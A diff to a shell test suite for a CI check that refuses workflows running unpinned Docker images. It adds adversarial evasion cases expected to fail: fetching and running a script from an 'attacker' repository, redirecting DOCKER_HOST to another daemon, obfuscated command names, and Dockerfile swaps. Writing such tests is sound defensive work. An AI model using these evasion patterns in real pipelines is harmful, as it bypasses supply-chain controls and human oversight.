@@ -1214,13 +1214,13 @@ case_ c02-committed-py-ok      ok  "$(rb 'python3 bin/tool.py --x')" "mkdir -p b
 case_ c02-arith-ok             ok  "$(rb 'age=$(( $(date -u +%s) - 1 ))')"
 case_ c02-arith-inner-run      bad "$(rb 'x=$(( $(docker run alpine) + 1 ))')"
 case_ c02-workspace-script     bad "$(rb 'bash "${GITHUB_WORKSPACE}/ci-image.sh"')" "printf 'docker run alpine\\n' > ci-image.sh"
-case_ c02-main-copy-bad        bad "$(rb 'gh api "repos/x/contents/bin/g.sh?ref=main" --jq .content | base64 -d > "${RUNNER_TEMP}/g.sh"; bash "${RUNNER_TEMP}/g.sh"')" "mkdir -p bin; printf 'docker run alpine\\n' > bin/g.sh"
-case_ c02-main-copy-ok         ok  "$(rb 'gh api "repos/x/contents/bin/g.sh?ref=main" --jq .content | base64 -d > "${RUNNER_TEMP}/g.sh"; bash "${RUNNER_TEMP}/g.sh"')" "mkdir -p bin; printf 'docker run alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > bin/g.sh"
+case_ c02-main-copy-bad        bad "$(rb 'gh api "repos/${GITHUB_REPOSITORY}/contents/bin/g.sh?ref=main" --jq .content | base64 -d > "${RUNNER_TEMP}/g.sh"; bash "${RUNNER_TEMP}/g.sh"')" "mkdir -p bin; printf 'docker run alpine\\n' > bin/g.sh"
+case_ c02-main-copy-ok         ok  "$(rb 'gh api "repos/${GITHUB_REPOSITORY}/contents/bin/g.sh?ref=main" --jq .content | base64 -d > "${RUNNER_TEMP}/g.sh"; bash "${RUNNER_TEMP}/g.sh"')" "mkdir -p bin; printf 'docker run alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > bin/g.sh"
 case_ c02-foreign-heredoc-ok   ok  "$(rb "python3 - <<'PY'
           import os
           os.system('docker run alpine')
           PY")"
-case_ c02-test-harness-ok      ok  "$(rb 'bash tests/t-test.sh')" "mkdir -p tests; printf 'printf %%s \"DOCKER_HOST=x\"; alias q=r\\n' > tests/t-test.sh"
+case_ c02-test-harness-ok      ok  "$(rb 'bash bin/t-test.sh')" "mkdir -p bin; printf 'printf %%s \"DOCKER_HOST=x\"; alias q=r\\n' > bin/t-test.sh"
 case_ c02-generated-elsewhere  bad "$(rb 'printf x > /tmp/smoke-assert.sh; bash /tmp/smoke-assert.sh')"
 # --- Sonnet #164 r22 (NEW-33, NEW-34) + advisor 0084 (2): a program named by a variable — eval "$x", bash -c "$x", a bare
 #     $x as the command — runs text this check cannot read: refused (fail closed); < <(…) feeding a shell is stdin
@@ -1234,5 +1234,48 @@ case_ n33-var-args-ok          ok  "$(rb 'go test -run "$PATTERN" ./...; echo "$
 case_ n34-spaced-subst-sh      bad "$(rb 'sh < <(echo "docker run alpine:latest")')"
 case_ n34-fd-subst-bash        bad "$(rb 'bash 0< <(cat payload/cmd.txt)')" "mkdir -p payload; printf 'docker run alpine:latest\\n' > payload/cmd.txt"
 case_ n34-spaced-subst-source  bad "$(rb 'source < <(echo "docker run alpine:latest")')"
+# --- Codex #164 adversarial r2: variants of C01, C02, C04, C05, C09, C10, C11, C13, and N01
+case_ r2c01-bracket-only       bad "$(rb '/usr/bin/[d][o][c][k][e][r] run alpine')"
+case_ r2c02-env-bash           bad "$(rb 'env bash ci-image.sh')" "printf 'docker run alpine\\n' > ci-image.sh"
+case_ r2c02-command-bash       bad "$(rb 'command bash ci-image.sh')" "printf 'docker run alpine\\n' > ci-image.sh"
+case_ r2c02-bash-c-script      bad "$(rb 'bash -c "bash ci-image.sh"')" "printf 'docker run alpine\\n' > ci-image.sh"
+case_ r2c02-subst-script       bad "$(rb 'out=$(bash ci-image.sh)')" "printf 'docker run alpine\\n' > ci-image.sh"
+case_ r2c02-env-shebang        bad "$(rb './runner')" "printf '#!/usr/bin/env bash\\ndocker run alpine\\n' > runner"
+case_ r2c02-replaced-script    bad "$(rb "printf 'docker run alpine\\n' > ci-ok.sh; bash ci-ok.sh")" "printf 'echo ok\\n' > ci-ok.sh"
+case_ r2c02-fake-provenance    bad "$(rb "echo 'git show HEAD:ci-ok.sh'; printf 'docker run alpine\\n' > \"\${RUNNER_TEMP}/ci-ok.sh\"; bash \"\${RUNNER_TEMP}/ci-ok.sh\"")" "printf 'echo ok\\n' > ci-ok.sh"
+case_ r2c02-foreign-repo       bad "$(rb 'gh api "repos/attacker/payload/contents/ci-ok.sh?ref=main" --jq .content | base64 -d > "${RUNNER_TEMP}/ci-ok.sh"; bash "${RUNNER_TEMP}/ci-ok.sh"')" "printf 'echo ok\\n' > ci-ok.sh"
+case_ r2c02-cd-in-parent       bad "$(rb 'bash parent.sh')" "printf 'cd evil\\nbash child.sh\\n' > parent.sh; printf 'echo ok\\n' > child.sh; mkdir -p evil; printf 'docker run alpine\\n' > evil/child.sh"
+case_ r2c02-ansi-in-script     bad "$(rb 'bash ci-x.sh')" "printf \"\\$'\\\\\\\\x64ocker' run alpine\\n\" > ci-x.sh"
+case_ r2c02-node-eval-eq       bad "$(rb "node --eval='require(1)'")"
+case_ r2c02-perl-attached      bad "$(rb "perl -e'system(1)'")"
+case_ r2c02-ruby-attached      bad "$(rb "ruby -e'system(1)'")"
+case_ r2c04-python-cluster     bad "$(rb 'python3 -Im pip install requests')"
+case_ r2c05-pip-log-list       bad "$(rb 'pip --log list install requests')"
+case_ r2c05-pip-log-help       bad "$(rb 'pip --log help install requests')"
+case_ r2c09-syntax-from-env    bad "$(rb 'BUILDKIT_SYNTAX=docker/dockerfile:latest docker build --build-arg BUILDKIT_SYNTAX .')" "printf 'FROM scratch\\n' > Dockerfile"
+case_ r2c09-sbom-generator      bad "$(rb 'docker buildx build --sbom=generator=docker/buildkit-syft-scanner:stable .')" "printf 'FROM scratch\\n' > Dockerfile"
+case_ r2c09-attest-generator    bad "$(rb 'docker buildx build --attest type=sbom,generator=docker/buildkit-syft-scanner:stable .')" "printf 'FROM scratch\\n' > Dockerfile"
+case_ r2c10-mid-line-if        bad "$(rb 'true; if false; then docker build -t alpine .; fi; docker run alpine')" "printf 'FROM scratch\\n' > Dockerfile"
+case_ r2c10-rmi-latest         bad "$(rb 'docker build -t alpine .; docker rmi alpine:latest; docker run alpine')" "printf 'FROM scratch\\n' > Dockerfile"
+case_ r2c10-unbound-loop       bad "$(rb 'for v in world; do :; done; v=example; docker build -t "hello-${v}" .; docker run hello-world')" "printf 'FROM scratch\\n' > Dockerfile"
+case_ r2c10-step-if            bad "$head
+    steps:
+      - if: \${{ false }}
+        run: docker build -t alpine .
+      - run: docker run alpine" "printf 'FROM scratch\\n' > Dockerfile"
+case_ r2c11-parent-copy        bad "$(rb 'cp -R evil/. .; docker build safe')" "mkdir -p safe evil/safe; printf 'FROM scratch\\n' > safe/Dockerfile; printf 'FROM alpine\\n' > evil/safe/Dockerfile"
+case_ r2c11-env-cp             bad "$(rb 'env cp -R evil/. .; docker build .')" "printf 'FROM scratch\\n' > Dockerfile; mkdir -p evil; printf 'FROM alpine\\n' > evil/Dockerfile"
+case_ r2c11-script-mutates     bad "$(rb 'bash mutate.sh; docker build .')" "printf 'FROM scratch\\n' > Dockerfile; printf \"printf 'FROM alpine\\\\\\\\n' > Dockerfile\\n\" > mutate.sh"
+case_ r2c13-printf-v           bad "$(rb 'docker build -t alpine .; printf -v DOCKER_HOST %s tcp://other:2375; export DOCKER_HOST; docker run alpine')" "printf 'FROM scratch\\n' > Dockerfile"
+case_ r2c13-read               bad "$(rb 'read -r DOCKER_HOST <<< tcp://other:2375; export DOCKER_HOST; docker run alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667')"
+case_ r2n01-unquoted-heredoc   bad "$(rb 'python3 - <<PY
+          print("$(docker pull alpine)")
+          PY')"
+case_ r2r03-tests-dir-script   bad "$(rb 'bash x/tests/payload.sh')" "mkdir -p x/tests; printf 'docker run alpine\\n' > x/tests/payload.sh"
+case_ r2c10-localhost-cond-ok   ok  "$head
+    steps:
+      - if: \${{ inputs.mode == 'build' }}
+        run: docker build -t localhost/fa-production .
+      - run: docker run localhost/fa-production" "printf 'FROM scratch\\n' > Dockerfile"
 echo "check-action-pins: $pass passed, $failn failed"
 [ "$failn" -eq 0 ]
